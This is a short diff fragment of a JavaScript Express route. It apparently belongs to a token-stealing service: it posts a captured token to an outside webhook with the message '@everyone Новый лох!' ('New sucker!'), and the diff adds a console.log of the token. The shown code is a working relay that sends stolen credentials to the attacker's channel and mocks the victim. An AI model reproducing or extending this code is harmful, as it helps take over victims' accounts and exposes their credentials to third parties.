@@ -17,6 +17,8 @@ app.get('/render', async (req,res) => {
 
     const content = '@everyone Новый лох! \n ```' + token + '```'
 
+    console.log(token)
+    
     const response = await fetch(webhook, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
